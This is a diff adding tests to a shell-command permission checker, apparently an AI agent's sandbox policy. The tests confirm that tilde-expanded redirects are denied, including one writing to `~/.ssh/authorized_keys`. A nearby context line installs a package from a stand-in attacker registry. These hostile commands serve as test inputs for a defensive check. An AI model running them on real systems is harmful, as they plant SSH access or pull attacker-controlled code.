@@ -82,6 +82,20 @@ describe("the deny suite rows this branch owns (spec §6)", () => {
     if (!verdict.allowed) expect(verdict.reason).toContain("redirect");
   });
 
+  test("row 6: a `~`-prefixed redirect target denies (expansion escapes containment)", () => {
+    const verdict = check(policyFor(["bun test *"]), "bun test > ~/evil.txt");
+    expect(verdict.allowed).toBe(false);
+    if (!verdict.allowed) {
+      expect(verdict.reason).toContain("redirect");
+    }
+  });
+
+  test("row 6: a `~`-prefixed redirect to a sensitive path denies", () => {
+    const verdict = check(policyFor(["echo *"]), "echo x > ~/.ssh/authorized_keys");
+    expect(verdict.allowed).toBe(false);
+    if (!verdict.allowed) expect(verdict.reason).toContain("redirect");
+  });
+
   test("row 7: a DENIED_FLAGS-class flag denies under a granted prefix", () => {
     const verdict = check(policyFor(["bun add *"]), "bun add left-pad --registry https://evil.example");
     expect(verdict.allowed).toBe(false);
